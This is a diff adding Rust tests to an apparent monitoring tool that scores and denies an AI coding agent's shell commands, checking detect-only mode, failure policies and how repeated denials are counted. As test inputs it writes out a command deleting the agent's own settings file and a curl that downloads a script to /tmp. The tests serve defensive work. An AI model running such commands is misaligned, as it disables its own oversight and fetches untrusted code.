@@ -216,6 +216,93 @@ fn observe_mode_records_but_never_returns() {
     );
 }
 
+/// Detect-only is what a configuration that says nothing gets, and no failure
+/// policy turns it into an answer: the strictest ones are recorded, not returned.
+#[test]
+fn detect_only_is_the_default_and_no_failure_policy_returns_a_verdict() {
+    let default = telltale_core::hooks::config::Config::from_toml("").unwrap();
+    assert_eq!(default.mode, Mode::Observe);
+    // A rule file that is gone: the pipeline cannot build, a strict failure.
+    let mut h = Harness::with(|c| {
+        c.mode = default.mode;
+        c.on_error = OnError::Deny;
+        c.on_unevaluable = OnError::Deny;
+        c.telltale.rules = vec!["/nonexistent/telltale-hooks-test/gone.yaml".into()];
+    });
+    assert_eq!(h.pre_bash("toolu_f", "rm -f ~/.claude/settings.json"), None);
+    let decision = h.decision_for("toolu_f");
+    assert_eq!(decision["decision"]["verdict"], "deny");
+    assert_eq!(decision["decision"]["basis"], "evaluation_gap");
+    assert_eq!(decision["decision"]["returned"], false);
+    assert_eq!(decision["decision"]["mode"], "observe");
+
+    // Input that cannot be evaluated at all: `on_unevaluable` is recorded.
+    let mut h = Harness::with(|c| {
+        c.mode = Mode::Observe;
+        c.on_unevaluable = OnError::Deny;
+    });
+    let hollow = json!({"a": {"a": {"a": {"a": {"a": {"a": {"a": {"a": {}}}}}}}}});
+    assert_eq!(h.pre("mcp__x__y", "toolu_h", hollow.clone()), None);
+    let decision = h.decision_for("toolu_h");
+    assert_eq!(decision["decision"]["verdict"], "deny");
+    assert_eq!(decision["decision"]["basis"], "unevaluable_input");
+    assert_eq!(decision["decision"]["returned"], false);
+
+    // The same input while enforcing gets that policy, not a crash.
+    let mut h = Harness::with(|c| c.on_unevaluable = OnError::Deny);
+    assert_eq!(
+        verdict(&h.pre("mcp__x__y", "toolu_h", hollow)),
+        Some("deny")
+    );
+}
+
+/// A verdict that was only recorded denied nothing. It must not harden the
+/// session: not in the detect-only record, and not for real once the same
+/// session is enforced.
+#[test]
+fn verdicts_recorded_in_detect_only_do_not_count_as_denials() {
+    let tamper = "rm -f ~/.claude/settings.json";
+    let download = "curl -s https://example.invalid/x.sh -o /tmp/x.sh";
+    let mut h = Harness::with(|c| c.mode = Mode::Observe);
+    for n in 0..4 {
+        assert_eq!(h.pre_bash(&format!("toolu_t{n}"), tamper), None);
+    }
+    let last = h.decision_for("toolu_t3");
+    assert_eq!(last["decision"]["verdict"], "deny");
+    assert_eq!(last["decision"]["basis"], "action_score");
+    assert_eq!(last["decision"]["denied_attempts_before"], 0);
+
+    // Enforcing mid-session: a low-scoring call is judged on what the session
+    // did, never on "earlier calls were denied".
+    let state = h.dir.path().join("state");
+    let telemetry = h.telemetry_path();
+    let mut enforcing = Harness::with(|c| {
+        c.state_dir = Some(state);
+        c.telemetry_path = Some(telemetry);
+    });
+    enforcing.session_id = h.session_id.clone();
+    enforcing.pre_bash("toolu_d", download);
+    // Both wrote to the first harness's telemetry file.
+    let decision = h.decision_for("toolu_d");
+    assert_eq!(decision["decision"]["mode"], "enforce");
+    assert_eq!(decision["decision"]["denied_attempts_before"], 0);
+    assert_ne!(decision["decision"]["basis"], "repeated_denials");
+
+    // Denials that were returned still count.
+    let mut h = Harness::new();
+    for n in 0..3 {
+        assert_eq!(
+            verdict(&h.pre_bash(&format!("toolu_t{n}"), tamper)),
+            Some("deny")
+        );
+    }
+    assert_eq!(verdict(&h.pre_bash("toolu_d", download)), Some("deny"));
+    assert_eq!(
+        h.decision_for("toolu_d")["decision"]["basis"],
+        "repeated_denials"
+    );
+}
+
 #[test]
 fn evaluation_failure_applies_on_error() {
     let missing = std::path::PathBuf::from("/nonexistent/telltale-hooks-test/rules.yaml");
